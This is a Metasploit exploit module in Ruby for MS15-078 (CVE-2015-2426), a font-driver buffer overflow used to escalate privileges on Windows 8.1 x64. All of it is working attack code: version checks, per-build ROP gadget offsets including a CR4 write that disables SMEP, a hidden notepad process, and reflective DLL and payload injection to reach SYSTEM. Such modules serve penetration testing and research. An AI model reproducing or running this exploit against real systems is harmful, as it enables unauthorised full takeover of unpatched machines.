# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;
require &#039;rex&#039;
 
class Metasploit3 < Msf::Exploit::Local
  Rank = ManualRanking
 
  WIN32K_VERSIONS = [
    &#039;6.3.9600.17393&#039;,
    &#039;6.3.9600.17630&#039;,
    &#039;6.3.9600.17694&#039;,
    &#039;6.3.9600.17796&#039;,
    &#039;6.3.9600.17837&#039;,
    &#039;6.3.9600.17915&#039;
  ]
 
  NT_VERSIONS = [
    &#039;6.3.9600.17415&#039;,
    &#039;6.3.9600.17630&#039;,
    &#039;6.3.9600.17668&#039;,
    &#039;6.3.9600.17936&#039;
  ]
 
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection
 
  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;            => &#039;MS15-078 Microsoft Windows Font Driver Buffer Overflow&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a pool based buffer overflow in the atmfd.dll driver when parsing
        a malformed font. The vulnerability was exploited by the hacking team and disclosed on
        the july data leak. This module has been tested successfully on vulnerable builds of
        Windows 8.1 x64.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          => [
          &#039;Eugene Ching&#039;,    # vulnerability discovery and exploit
          &#039;Mateusz Jurczyk&#039;, # vulnerability discovery
          &#039;Cedric Halbronn&#039;, # vulnerability and exploit analysis
          &#039;juan vazquez&#039;     # msf module
        ],
      &#039;Arch&#039;            => ARCH_X86_64,
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;DefaultOptions&#039;  => {
          &#039;EXITFUNC&#039;    => &#039;thread&#039;,
        },
      &#039;Targets&#039;         => [
          [ &#039;Windows 8.1 x64&#039;,  { } ]
        ],
      &#039;Payload&#039;         => {
          &#039;Space&#039;       => 4096,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;      => [
          [&#039;CVE&#039;, &#039;2015-2426&#039;],
          [&#039;CVE&#039;, &#039;2015-2433&#039;],
          [&#039;MSB&#039;, &#039;MS15-078&#039;],
          [&#039;MSB&#039;, &#039;MS15-080&#039;],
          [&#039;URL&#039;, &#039;https://github.com/vlad902/hacking-team-windows-kernel-lpe&#039;],
          [&#039;URL&#039;, &#039;https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2015/september/exploiting-cve-2015-2426-and-how-i-ported-it-to-a-recent-windows-8.1-64-bit/&#039;],
          [&#039;URL&#039;, &#039;https://code.google.com/p/google-security-research/issues/detail?id=369&#039;],
          [&#039;URL&#039;, &#039;https://code.google.com/p/google-security-research/issues/detail?id=480&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Jul 11 2015&#039;,
      &#039;DefaultTarget&#039;   => 0
    }))
  end
 
  def patch_win32k_offsets(dll)
    @win32k_offsets.each do |k, v|
      case k
      when &#039;info_leak&#039;
        dll.gsub!([0xdeedbeefdeedbe00].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;pop_rax_ret&#039;
        dll.gsub!([0xdeedbeefdeedbe01].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;xchg_rax_rsp&#039;
        dll.gsub!([0xdeedbeefdeedbe02].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;allocate_pool&#039;
        dll.gsub!([0xdeedbeefdeedbe03].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;pop_rcx_ret&#039;
        dll.gsub!([0xdeedbeefdeedbe04].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;deref_rax_into_rcx&#039;
        dll.gsub!([0xdeedbeefdeedbe05].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;mov_rax_into_rcx&#039;
        dll.gsub!([0xdeedbeefdeedbe06].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;pop_rbx_ret&#039;
        dll.gsub!([0xdeedbeefdeedbe07].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;ret&#039;
        dll.gsub!([0xdeedbeefdeedbe08].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;mov_rax_r11_ret&#039;
        dll.gsub!([0xdeedbeefdeedbe09].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;add_rax_rcx_ret&#039;
        dll.gsub!([0xdeedbeefdeedbe0a].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;pop_rsp_ret&#039;
        dll.gsub!([0xdeedbeefdeedbe0b].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;xchg_rax_rsp_adjust&#039;
        dll.gsub!([0xdeedbeefdeedbe0c].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;chwnd_delete&#039;
        dll.gsub!([0xdeedbeefdeedbe0d].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      end
    end
  end
 
  def set_win32k_offsets
    @win32k_offsets ||= Proc.new do |version|
      case version
      when &#039;6.3.9600.17393&#039;
        {
          &#039;info_leak&#039;           => 0x3cf00,
          &#039;pop_rax_ret&#039;         => 0x19fab,  # pop rax # ret # 58 C3
          &#039;xchg_rax_rsp&#039;        => 0x6121,   # xchg eax, esp # ret # 94 C3
          &#039;allocate_pool&#039;       => 0x352220, # import entry nt!ExAllocatePoolWithTag
          &#039;pop_rcx_ret&#039;         => 0x98156,  # pop rcx # ret # 59 C3
          &#039;deref_rax_into_rcx&#039;  => 0xc432f,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          &#039;mov_rax_into_rcx&#039;    => 0xc4332,  # mov [rcx], rax # ret # 48 89 01 C3
          &#039;pop_rbx_ret&#039;         => 0x14db,   # pop rbx # ret # 5B C3
          &#039;ret&#039;                 => 0x6e314,  # ret C3
          &#039;mov_rax_r11_ret&#039;     => 0x7018e,  # mov rax, r11 # ret # 49 8B C3 C3
          &#039;add_rax_rcx_ret&#039;     => 0xee38f,  # add rax, rcx # ret # 48 03 C1 C3
          &#039;pop_rsp_ret&#039;         => 0xbc8f,   # pop rsp # ret # 5c c3
          &#039;xchg_rax_rsp_adjust&#039; => 0x189a3a, # xchg esp, eax # sbb al, 0 # mov eax, ebx # add rsp, 20h # pop rbx # ret # 94 1C 00 8B C3 48 83 c4 20 5b c3
          &#039;chwnd_delete&#039;        => 0x165010  # CHwndTargetProp::Delete
        }
      when &#039;6.3.9600.17630&#039;
        {
          &#039;info_leak&#039;           => 0x3d200,
          &#039;pop_rax_ret&#039;         => 0x19e9b,  # pop rax # ret # 58 C3
          &#039;xchg_rax_rsp&#039;        => 0x6024,   # xchg eax, esp # ret # 94 C3
          &#039;allocate_pool&#039;       => 0x351220, # import entry nt!ExAllocatePoolWithTag
          &#039;pop_rcx_ret&#039;         => 0x84f4f,  # pop rcx # ret # 59 C3
          &#039;deref_rax_into_rcx&#039;  => 0xc3f7f,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          &#039;mov_rax_into_rcx&#039;    => 0xc3f82,  # mov [rcx], rax # ret # 48 89 01 C3
          &#039;pop_rbx_ret&#039;         => 0x14db,   # pop rbx # ret # 5B C3
          &#039;ret&#039;                 => 0x14dc,   # ret C3
          &#039;mov_rax_r11_ret&#039;     => 0x7034e,  # mov rax, r11 # ret # 49 8B C3 C3
          &#039;add_rax_rcx_ret&#039;     => 0xed33b,  # add rax, rcx # ret # 48 03 C1 C3
          &#039;pop_rsp_ret&#039;         => 0xbb93,   # pop rsp # ret # 5c c3
          &#039;xchg_rax_rsp_adjust&#039; => 0x17c78c, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          &#039;chwnd_delete&#039;        => 0x146EE0  # CHwndTargetProp::Delete
        }
      when &#039;6.3.9600.17694&#039;
        {
          &#039;info_leak&#039;           => 0x3d300,
          &#039;pop_rax_ret&#039;         => 0x151f4,  # pop rax # ret # 58 C3
          &#039;xchg_rax_rsp&#039;        => 0x600c,   # xchg eax, esp # ret # 94 C3
          &#039;allocate_pool&#039;       => 0x351220, # import entry nt!ExAllocatePoolWithTag
          &#039;pop_rcx_ret&#039;         => 0x2cf10,  # pop rcx # ret # 59 C3
          &#039;deref_rax_into_rcx&#039;  => 0xc3757,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          &#039;mov_rax_into_rcx&#039;    => 0xc375a,  # mov [rcx], rax # ret # 48 89 01 C3
          &#039;pop_rbx_ret&#039;         => 0x6682,   # pop rbx # ret # 5B C3
          &#039;ret&#039;                 => 0x6683,   # ret C3
          &#039;mov_rax_r11_ret&#039;     => 0x7010e,  # mov rax, r11 # ret # 49 8B C3 C3
          &#039;add_rax_rcx_ret&#039;     => 0xecd7b,  # add rax, rcx # ret # 48 03 C1 C3
          &#039;pop_rsp_ret&#039;         => 0x71380,  # pop rsp # ret # 5c c3
          &#039;xchg_rax_rsp_adjust&#039; => 0x178c84, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          &#039;chwnd_delete&#039;        => 0x1513D8  # CHwndTargetProp::Delete
        }
      when &#039;6.3.9600.17796&#039;
        {
          &#039;info_leak&#039;           => 0x3d000,
          &#039;pop_rax_ret&#039;         => 0x19e4f,  # pop rax # ret # 58 C3
          &#039;xchg_rax_rsp&#039;        => 0x5f64,   # xchg eax, esp # ret # 94 C3
          &#039;allocate_pool&#039;       => 0x352220, # import entry nt!ExAllocatePoolWithTag
          &#039;pop_rcx_ret&#039;         => 0x97a5e,  # pop rcx # ret # 59 C3
          &#039;deref_rax_into_rcx&#039;  => 0xc3aa7,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          &#039;mov_rax_into_rcx&#039;    => 0xc3aaa,  # mov [rcx], rax # ret # 48 89 01 C3
          &#039;pop_rbx_ret&#039;         => 0x1B20,   # pop rbx # ret # 5B C3
          &#039;ret&#039;                 => 0x1B21,   # ret C3
          &#039;mov_rax_r11_ret&#039;     => 0x7010e,  # mov rax, r11 # ret # 49 8B C3 C3
          &#039;add_rax_rcx_ret&#039;     => 0xecf8b,  # add rax, rcx # ret # 48 03 C1 C3
          &#039;pop_rsp_ret&#039;         => 0x29fd3,  # pop rsp # ret # 5c c3
          &#039;xchg_rax_rsp_adjust&#039; => 0x1789e4, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          &#039;chwnd_delete&#039;        => 0x150F58  # CHwndTargetProp::Delete
 
        }
      when &#039;6.3.9600.17837&#039;
        {
          &#039;info_leak&#039;           => 0x3d800,
          &#039;pop_rax_ret&#039;         => 0x1a51f,  # pop rax # ret # 58 C3
          &#039;xchg_rax_rsp&#039;        => 0x62b4,   # xchg eax, esp # ret # 94 C3
          &#039;allocate_pool&#039;       => 0x351220, # import entry nt!ExAllocatePoolWithTag
          &#039;pop_rcx_ret&#039;         => 0x97a4a,  # pop rcx # ret # 59 C3
          &#039;deref_rax_into_rcx&#039;  => 0xc3687,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          &#039;mov_rax_into_rcx&#039;    => 0xc368a,  # mov [rcx], rax # ret # 48 89 01 C3
          &#039;pop_rbx_ret&#039;         => 0x14db,   # pop rbx # ret # 5B C3
          &#039;ret&#039;                 => 0x14dc,   # ret C3
          &#039;mov_rax_r11_ret&#039;     => 0x94871,  # mov rax, r11 # ret # 49 8B C3 C3
          &#039;add_rax_rcx_ret&#039;     => 0xecbdb,  # add rax, rcx # ret # 48 03 C1 C3
          &#039;pop_rsp_ret&#039;         => 0xbd2c,   # pop rsp # ret # 5c c3
          &#039;xchg_rax_rsp_adjust&#039; => 0x15e84c, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          &#039;chwnd_delete&#039;        => 0x15A470  # CHwndTargetProp::Delete
        }
      when &#039;6.3.9600.17915&#039;
        {
          &#039;info_leak&#039;           => 0x3d800,
          &#039;pop_rax_ret&#039;         => 0x1A4EF,  # pop rax # ret # 58 C3
          &#039;xchg_rax_rsp&#039;        => 0x62CC,   # xchg eax, esp # ret # 94 C3
          &#039;allocate_pool&#039;       => 0x351220, # import entry nt!ExAllocatePoolWithTag
          &#039;pop_rcx_ret&#039;         => 0x9765A,  # pop rcx # ret # 59 C3
          &#039;deref_rax_into_rcx&#039;  => 0xC364F,  # mov rax, [rax] # mov [rcx], rax # ret # 48 8B 00 48 89 01 C3
          &#039;mov_rax_into_rcx&#039;    => 0xC3652,  # mov [rcx], rax # ret # 48 89 01 C3
          &#039;pop_rbx_ret&#039;         => 0x14DB,   # pop rbx # ret # 5B C3
          &#039;ret&#039;                 => 0x14DC,   # ret # C3
          &#039;mov_rax_r11_ret&#039;     => 0x7060e,  # mov rax, r11 # ret # 49 8B C3 C3
          &#039;add_rax_rcx_ret&#039;     => 0xECDCB,  # add rax, rcx # 48 03 C1 C3
          &#039;pop_rsp_ret&#039;         => 0xbe33,   # pop rsp # ret # 5c c3
          &#039;xchg_rax_rsp_adjust&#039; => 0x15e5fc, # xchg esp, eax # rol byte ptr [rcx-75h], 0c0h # add rsp, 28h # ret # 94 c0 41 8b c0 48 83 c4 28 c3
          &#039;chwnd_delete&#039;        => 0x15A220  # CHwndTargetProp::Delete
        }
      else
        nil
      end
    end.call(@win32k)
  end
 
  def patch_nt_offsets(dll)
    @nt_offsets.each do |k, v|
      case k
      when &#039;set_cr4&#039;
        dll.gsub!([0xdeedbeefdeedbe0e].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      when &#039;allocate_pool_with_tag&#039;
        dll.gsub!([0xdeedbeefdeedbe0f].pack(&#039;Q<&#039;), [v].pack(&#039;Q<&#039;))
      end
    end
  end
 
  def set_nt_offsets
    @nt_offsets ||= Proc.new do |version|
      case version
      when &#039;6.3.9600.17415&#039;
        {
          &#039;set_cr4&#039;                => 0x38a3cc, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3
          &#039;allocate_pool_with_tag&#039; => 0x2a3a50  # ExAllocatePoolWithTag
        }
      when &#039;6.3.9600.17630&#039;
        {
          &#039;set_cr4&#039;                => 0x38A3BC, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3
          &#039;allocate_pool_with_tag&#039; => 0x2A3A50  # ExAllocatePoolWithTag
        }
      when &#039;6.3.9600.17668&#039;
        {
          &#039;set_cr4&#039;                => 0x38A3BC, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3
          &#039;allocate_pool_with_tag&#039; => 0x2A3A50  # ExAllocatePoolWithTag
        }
      when &#039;6.3.9600.17936&#039;
        {
          &#039;set_cr4&#039;                => 0x3863bc, # mov cr4, rax # add rsp, 28h # ret # 0F 22 E0 48 83 C4 28 C3
          &#039;allocate_pool_with_tag&#039; => 0x29FA50  # ExAllocatePoolWithTag
        }
      else
        nil
      end
    end.call(@ntoskrnl)
  end
 
  def atmfd_version
    file_path = expand_path(&#039;%windir%&#039;) << &#039;\\system32\\atmfd.dll&#039;
    major, minor, build, revision, branch = file_version(file_path)
    return nil if major.nil?
    ver = "#{major}.#{minor}.#{build}.#{revision}"
    vprint_status("atmfd.dll file version: #{ver} branch: #{branch}")
 
    ver
  end
 
  def win32k_version
    file_path = expand_path(&#039;%windir%&#039;) << &#039;\\system32\\win32k.sys&#039;
    major, minor, build, revision, branch = file_version(file_path)
    return nil if major.nil?
    ver = "#{major}.#{minor}.#{build}.#{revision}"
    vprint_status("win32k.sys file version: #{ver} branch: #{branch}")
 
    ver
  end
 
  def ntoskrnl_version
    file_path = expand_path(&#039;%windir%&#039;) << &#039;\\system32\\ntoskrnl.exe&#039;
    major, minor, build, revision, branch = file_version(file_path)
    return nil if major.nil?
    ver = "#{major}.#{minor}.#{build}.#{revision}"
    vprint_status("ntoskrnl.exe file version: #{ver} branch: #{branch}")
 
    ver
  end
 
  def check
    # We have tested only windows 8.1
    if sysinfo[&#039;OS&#039;] !~ /Windows 8/i
      return Exploit::CheckCode::Unknown
    end
 
    # We have tested only 64 bits
    if sysinfo[&#039;Architecture&#039;] !~ /(wow|x)64/i
      return Exploit::CheckCode::Unknown
    end
 
    atmfd = atmfd_version
    # atmfd 5.1.2.238 => Works
    unless atmfd && Gem::Version.new(atmfd) <= Gem::Version.new(&#039;5.1.2.243&#039;)
      return Exploit::CheckCode::Safe
    end
 
    # win32k.sys 6.3.9600.17393 => Works
    @win32k = win32k_version
 
    unless @win32k && WIN32K_VERSIONS.include?(@win32k)
      return Exploit::CheckCode::Detected
    end
 
    # ntoskrnl.exe 6.3.9600.17415 => Works
    @ntoskrnl = ntoskrnl_version
 
    unless @ntoskrnl && NT_VERSIONS.include?(@ntoskrnl)
      return Exploit::CheckCode::Unknown
    end
 
    Exploit::CheckCode::Appears
  end
 
  def exploit
    print_status(&#039;Checking target...&#039;)
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end
 
    check_result = check
    if check_result == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, &#039;Target not vulnerable&#039;)
    end
 
    if check_result == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, &#039;Exploit not available on this system.&#039;)
    end
 
    if check_result == Exploit::CheckCode::Detected
      fail_with(Failure::NotVulnerable, &#039;ROP chain not available for the target nt/win32k&#039;)
    end
 
    unless get_target_arch == ARCH_X86_64
      fail_with(Failure::NoTarget, &#039;Running against WOW64 is not supported&#039;)
    end
 
    print_status("Exploiting with win32k #{@win32k} and nt #{@ntoskrnl}...")
 
    set_win32k_offsets
    fail_with(Failure::NoTarget, &#039;win32k.sys offsets not available&#039;) if @win32k_offsets.nil?
 
    set_nt_offsets
    fail_with(Failure::NoTarget, &#039;ntoskrnl.exe offsets not available&#039;) if @nt_offsets.nil?
 
    begin
      print_status(&#039;Launching notepad to host the exploit...&#039;)
      notepad_process = client.sys.process.execute(&#039;notepad.exe&#039;, nil, {&#039;Hidden&#039; => true})
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      # Sandboxes could not allow to create a new process
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status(&#039;Operation failed. Trying to elevate the current process...&#039;)
      process = client.sys.process.open
    end
 
    library_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2015-2426&#039;, &#039;reflective_dll.x64.dll&#039;)
    library_path = ::File.expand_path(library_path)
 
    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    dll = &#039;&#039;
    ::File.open(library_path, &#039;rb&#039;) { |f| dll = f.read }
 
    patch_win32k_offsets(dll)
    patch_nt_offsets(dll)
 
    exploit_mem, offset = inject_dll_data_into_process(process, dll)
 
    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)
 
    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status(&#039;Payload injected. Executing exploit...&#039;)
    process.thread.create(exploit_mem + offset, payload_mem)
 
    print_good(&#039;Exploit finished, wait for (hopefully privileged) payload execution to complete.&#039;)
  end
 
end

